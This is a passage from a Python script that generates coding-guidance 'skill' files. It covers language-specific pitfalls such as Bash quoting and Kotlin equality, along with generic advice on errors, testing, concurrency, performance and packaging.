               "Capturing `var` in lambdas; coroutine scope/cancellation leaks.",
               "Equality: `==` (structural) vs `===` (referential)."],
    "Bash": ["Unquoted variables word-split and glob — always quote `\"$var\"`.",
             "`set -euo pipefail` off by default; errors pass silently.",
             "Parsing `ls`; spaces in filenames breaking loops.",
             "Injection from unquoted input into commands."],
}


def gen_language_gotchas():
    for lang, gotchas in LANG_GOTCHAS.items():
        skill(f"languages/{_lang_slug(lang)}",
              f"{lang} common pitfalls",
              f"The sharp edges of {lang} that actually cause bugs — avoid them.",
              [_slug(lang), "pitfalls", "footguns"],
              f"Writing or reviewing {lang}; catching the language-specific bugs.",
              [f"Watch for: {g}" for g in gotchas],
              ["These are the bugs that pass review and bite in production.",
               "When one looks intentional, leave a comment saying why."])

# Generic, still-true fallback content per aspect (used for GENERIC_LANGS).
GENERIC = {
    "idioms": (["Follow the language's official style guide and formatter.",
                "Prefer the standard library and well-known idioms over clever tricks.",
                "Keep functions small and names clear; let the type system help."],
               ["Fighting the language's conventions makes code others can't read.",
                "Reinventing stdlib utilities."]),
    "errors": (["Use the language's idiomatic error mechanism (exceptions or result types).",
                "Handle or propagate — never silently swallow; preserve context.",
                "Validate at boundaries and fail early with a clear message."],
               ["Swallowing errors hides real failures.",
                "Generic catch-alls that lose the cause."]),
    "testing": (["Use the standard test framework and runner.",
                 "Cover the happy path, edges, and error paths; regression-test each bug.",
                 "Keep tests fast, isolated, and deterministic."],
                ["Non-deterministic tests erode trust.",
                 "Testing implementation details instead of behavior."]),
    "concurrency": (["Use the language's concurrency model correctly (goroutines/channels, async, threads).",
                     "Protect shared state; prefer message passing; bound parallelism.",
                     "Always handle cancellation/timeouts."],
                    ["Data races on shared mutable state.",
                     "Unbounded concurrency exhausting resources."]),
    "perf": (["Measure with a profiler before optimizing.",
              "Fix the algorithm before micro-optimizing; reduce allocations in hot paths.",
              "Prove the speedup with before/after numbers."],
             ["Guessing the bottleneck.",
              "Trading correctness/clarity for a micro-gain."]),
    "packaging": (["Use the standard build tool and dependency manager with a lockfile.",
                   "Pin versions; separate runtime vs dev deps; produce reproducible builds."],
                  ["Unpinned dependencies drift and break builds.",
                   "Committing build artifacts."]),
}


def gen_languages():
    for lang, data in LANG_DATA.items():
        for aspect, meta in LANG_ASPECTS.items():
            name, desc, tags, when, _, _ = meta
            steps, pit = data[aspect]
            skill(f"languages/{_slug(lang)}",
                  name.format(L=lang), desc.format(L=lang),
                  [_slug(lang)] + tags,
                  when.format(L=lang), steps, pit)
    for lang in GENERIC_LANGS:
        for aspect, meta in LANG_ASPECTS.items():
            name, desc, tags, when, _, _ = meta
            steps, pit = GENERIC[aspect]
            skill(f"languages/{_lang_slug(lang)}",
                  name.format(L=lang), desc.format(L=lang),
                  [_slug(lang)] + tags,
                  when.format(L=lang), steps, pit)


if __name__ == "__main__":
    import shutil
    if OUT.exists():
        shutil.rmtree(OUT)
    gen_security()
    gen_languages()
    gen_language_gotchas()
    # more domains are added by the sibling gen_skills2 module if present
    try:
        import gen_skills2
        gen_skills2.generate(skill, _slug)
    except Exception as e:
        print(f"(gen_skills2 not run: {e})")
    print(f"wrote {len(_written)} skills to {OUT}")
